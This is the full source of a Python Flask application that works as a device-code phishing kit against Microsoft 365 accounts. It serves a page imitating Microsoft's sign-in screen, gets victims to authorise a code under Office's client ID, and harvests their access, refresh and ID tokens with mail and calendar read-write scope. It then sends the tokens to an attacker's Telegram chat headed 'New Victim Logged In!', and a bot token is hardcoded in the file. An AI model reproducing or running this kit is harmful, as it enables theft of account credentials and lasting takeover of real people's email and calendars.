import os
import time
import uuid
import sqlite3
import threading
import requests
from flask import Flask, request, jsonify, make_response

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

# Official first-party Microsoft Office client ID
CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"

AUTH_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

SCOPE = ("https://outlook.office.com/Mail.ReadWrite "
         "https://outlook.office.com/Calendars.ReadWrite "
         "offline_access openid profile email")

app = Flask(__name__)
DB_NAME = os.environ.get("DB_PATH", "/tmp/sessions.db")


# --- DATABASE ---
def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
        sid TEXT PRIMARY KEY,
        device_code TEXT,
        user_code TEXT,
        verification_uri TEXT,
        status TEXT DEFAULT 'pending',
        access_token TEXT,
        refresh_token TEXT,
        id_token TEXT,
        created_at INTEGER
    )''')
    conn.commit()
    conn.close()


def get_db():
    conn = sqlite3.connect(DB_NAME, timeout=30)
    conn.row_factory = sqlite3.Row
    return conn


def save_session(sid, device_code, user_code, verification_uri):
    conn = get_db()
    try:
        conn.execute(
            'INSERT OR REPLACE INTO sessions (sid, device_code, user_code, verification_uri, status, created_at) VALUES (?,?,?,?,?,?)',
            (sid, device_code, user_code, verification_uri, 'pending', int(time.time())))
        conn.commit()
    finally:
        conn.close()


def update_session_tokens(sid, data):
    conn = get_db()
    try:
        conn.execute('''UPDATE sessions SET status='completed',
            access_token=?, refresh_token=?, id_token=? WHERE sid=?''',
            (data.get('access_token'), data.get('refresh_token'),
             data.get('id_token'), sid))
        conn.commit()
    finally:
        conn.close()


def get_session(sid):
    conn = get_db()
    try:
        row = conn.execute('SELECT * FROM sessions WHERE sid=?', (sid,)).fetchone()
        return dict(row) if row else None
    finally:
        conn.close()


def mark_status(sid, status):
    conn = get_db()
    try:
        conn.execute('UPDATE sessions SET status=? WHERE sid=?', (status, sid))
        conn.commit()
    finally:
        conn.close()


# --- TELEGRAM ---
def send_telegram(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    for attempt in range(3):
        try:
            chunks = [text[i:i + 3900] for i in range(0, len(text), 3900)] or [text]
            ok = True
            for chunk in chunks:
                r = requests.post(url, json={
                    "chat_id": TELEGRAM_CHAT_ID,
                    "text": chunk,
                    "parse_mode": "HTML"
                }, timeout=20)
                if r.status_code != 200:
                    ok = False
            if ok:
                return
        except Exception as e:
            print(f"Telegram attempt {attempt+1} failed: {e}")
        time.sleep(3)


# --- POLLING ---
def poll_for_token(sid, device_code):
    # Skip if another thread already finished this session
    sess = get_session(sid)
    if not sess or sess['status'] != 'pending':
        return

    interval = 5
    deadline = time.time() + 880
    while time.time() < deadline:
        # Stop if another worker already completed it (restart recovery)
        cur = get_session(sid)
        if cur and cur['status'] != 'pending':
            return
        time.sleep(interval)
        try:
            r = requests.post(TOKEN_URL, data={
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                "client_id": CLIENT_ID,
                "device_code": device_code,
            }, timeout=20)
            data = r.json()
        except Exception as e:
            print(f"Poll exception {sid}: {e}")
            continue

        if "access_token" in data:
            update_session_tokens(sid, data)
            sess = get_session(sid)
            user_code = sess['user_code'] if sess else '?'
            ua_note = "Victim completed sign-in."
            msg = (f"🎯 <b>New Victim Logged In!</b>\n\n"
                   f"<b>Code:</b> <code>{user_code}</code>\n"
                   f"<b>Info:</b> {ua_note}\n\n"
                   f"<b>Access Token:</b>\n<code>{data.get('access_token','')}</code>\n\n"
                   f"<b>Refresh Token:</b>\n<code>{data.get('refresh_token','')}</code>\n\n"
                   f"<b>ID Token:</b>\n<code>{data.get('id_token','')}</code>")
            send_telegram(msg)
            print(f"SUCCESS {sid} — Telegram sent")
            return
        elif data.get("error") == "authorization_pending":
            continue
        elif data.get("error") == "slow_down":
            interval = min(interval + 5, 15)
            continue
        elif data.get("error") == "authorization_declined":
            mark_status(sid, 'declined')
            print(f"Victim declined {sid}")
            return
        elif data.get("error") == "expired_token":
            mark_status(sid, 'expired')
            print(f"Code expired {sid}")
            return
        else:
            print(f"Poll error {sid}: {data}")
            mark_status(sid, 'error')
            return
    mark_status(sid, 'expired')


def recovery_loop():
    """Every 30s, find pending sessions whose polling thread died (e.g. after
    a gunicorn restart) and restart polling for them."""
    while True:
        try:
            conn = get_db()
            rows = conn.execute(
                "SELECT sid, device_code FROM sessions WHERE status='pending' AND created_at > ?",
                (int(time.time()) - 800,)).fetchall()
            conn.close()
            now = time.time()
            for row in rows:
                sid = row['sid']
                last = POLLING_LAST_SEEN.get(sid, 0)
                # If no live poller has touched it in the last 15s, revive it
                if now - last > 15:
                    POLLING_LAST_SEEN[sid] = now
                    threading.Thread(target=poll_worker, args=(sid, row['device_code']),
                                     daemon=True).start()
        except Exception as e:
            print(f"Recovery error: {e}")
        time.sleep(30)


POLLING_LAST_SEEN = {}


def poll_worker(sid, device_code):
    POLLING_LAST_SEEN[sid] = time.time()
    poll_for_token(sid, device_code)


# --- INLINE MICROSOFT LOGO (no external CDN, always loads) ---
MS_LOGO = """<svg viewBox="0 0 41 41" xmlns="http://www.w3.org/2000/svg" width="90" height="90">
<rect x="0" y="0" width="19" height="19" fill="#f25022"/>
<rect x="22" y="0" width="19" height="19" fill="#7fba00"/>
<rect x="0" y="22" width="19" height="19" fill="#00a4ef"/>
<rect x="22" y="22" width="19" height="19" fill="#ffb900"/>
</svg>"""


# --- ROUTES ---
@app.route('/')
def index():
    sid = uuid.uuid4().hex[:12]

    try:
        r = requests.post(AUTH_URL, data={
            "client_id": CLIENT_ID,
            "scope": SCOPE,
        }, timeout=20)
        resp_data = r.json()
    except Exception as e:
        return f"Error contacting Microsoft: {e}", 500

    if "device_code" not in resp_data:
        return f"Microsoft error: {resp_data}", 500

    device_code = resp_data["device_code"]
    user_code = resp_data["user_code"]
    verification_uri = resp_data.get("verification_uri",
                                     "https://microsoft.com/devicelogin")

    save_session(sid, device_code, user_code, verification_uri)
    POLLING_LAST_SEEN[sid] = time.time()
    threading.Thread(target=poll_worker, args=(sid, device_code), daemon=True).start()

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to your account</title>
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 41 41'%3E%3Crect width='19' height='19' fill='%23f25022'/%3E%3Crect x='22' width='19' height='19' fill='%237fba00'/%3E%3Crect y='22' width='19' height='19' fill='%2300a4ef'/%3E%3Crect x='22' y='22' width='19' height='19' fill='%23ffb900'/%3E%3C/svg%3E">
<style>
  * {{ box-sizing:border-box; }}
  html,body {{ margin:0;padding:0; }}
  body {{
    font-family:"Segoe UI","Helvetica Neue",Helvetica,Arial,sans-serif;
    background:#f2f2f2; min-height:100vh;
    display:flex; flex-direction:column; align-items:center;
  }}
  .outer {{ width:100%; max-width:440px; padding:44px 24px 0; }}
  .logo svg {{ display:block; }}
  h1 {{ font-size:24px; font-weight:400; color:#1b1b1b; margin:14px 0 12px; }}
  .desc {{ font-size:15px; color:#1b1b1b; line-height:1.55; margin:0 0 8px; }}
  .code-box {{
    display:inline-block; background:#fff; border:1px solid #0067b8;
    padding:14px 22px; font-size:30px; font-weight:600; letter-spacing:3px;
    color:#0067b8; margin:18px 0 20px; user-select:all;
  }}
  .btn {{
    background:#0067b8; color:#fff; border:none; padding:10px 28px;
    font-size:15px; font-family:inherit; cursor:pointer; display:block;
  }}
  .btn:hover {{ background:#005da6; }}
  .btn:focus {{ outline:1px dashed #000; outline-offset:2px; }}
  .learn {{ margin-top:22px; font-size:13px; color:#0067b8; text-decoration:none; }}
  .learn:hover {{ text-decoration:underline; }}
  .footer {{
    margin-top:auto; width:100%; background:#fff; border-top:1px solid #e6e6e6;
    padding:12px 24px; font-size:13px; color:#767676;
    display:flex; justify-content:space-between; flex-wrap:wrap; gap:8px;
  }}
  .footer a {{ color:#767676; text-decoration:none; margin-left:18px; }}
  .footer a:hover {{ text-decoration:underline; }}
  @media (max-width:460px) {{ .outer {{ padding-top:24px; }} }}
</style>
</head>
<body>
  <div class="outer">
    <div class="logo">{MS_LOGO}</div>
    <h1>Enter the code</h1>
    <p class="desc">To sign in to <b>Microsoft Office</b>, enter the code shown below on your other device.</p>
    <div class="code-box" id="codeDisplay">{user_code}</div>
    <button class="btn" onclick="handleCopy()">Copy Code &amp; Continue</button>
    <a class="learn" href="https://www.microsoft.com/security" target="_blank" rel="noopener">Learn more about signing in with a code</a>
  </div>
  <div class="footer">
    <span>© 2026 Microsoft</span>
    <span>
      <a href="https://www.microsoft.com/en-us/privacy" target="_blank" rel="noopener">Privacy</a>
      <a href="https://www.microsoft.com/en-us/servicesagreement" target="_blank" rel="noopener">Terms</a>
    </span>
  </div>
<script>
function handleCopy() {{
  var code = document.getElementById('codeDisplay').innerText;
  var done = function() {{ window.location.href = "{verification_uri}"; }};
  if (navigator.clipboard && navigator.clipboard.writeText) {{
    navigator.clipboard.writeText(code).then(done).catch(done);
  }} else {{
    var ta = document.createElement('textarea');
    ta.value = code; document.body.appendChild(ta);
    ta.select(); try {{ document.execCommand('copy'); }} catch(e) {{}}
    document.body.removeChild(ta); done();
  }}
}}
</script>
</body>
</html>"""

    resp = make_response(html)
    resp.headers['Cache-Control'] = 'no-store'
    return resp


@app.route('/status')
def status():
    sid = request.args.get('sid')
    sess = get_session(sid) if sid else None
    if not sess:
        return jsonify({"status": "not_found"}), 404
    return jsonify({"status": sess['status']})


@app.route('/debug')
def debug():
    conn = get_db()
    try:
        rows = conn.execute(
            'SELECT sid, status, user_code, created_at FROM sessions ORDER BY created_at DESC LIMIT 15'
        ).fetchall()
        out = "<h2>Recent Sessions</h2><table border='1' cellpadding='6'><tr><th>SID</th><th>Status</th><th>Code</th><th>Created (unix)</th></tr>"
        for row in rows:
            out += f"<tr><td>{row['sid']}</td><td>{row['status']}</td><td>{row['user_code']}</td><td>{row['created_at']}</td></tr>"
        return out + "</table>"
    finally:
        conn.close()


@app.route('/test-telegram')
def test_telegram():
    send_telegram("✅ Telegram is working!")
    return "Sent — check Telegram."


init_db()
threading.Thread(target=recovery_loop, daemon=True).start()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
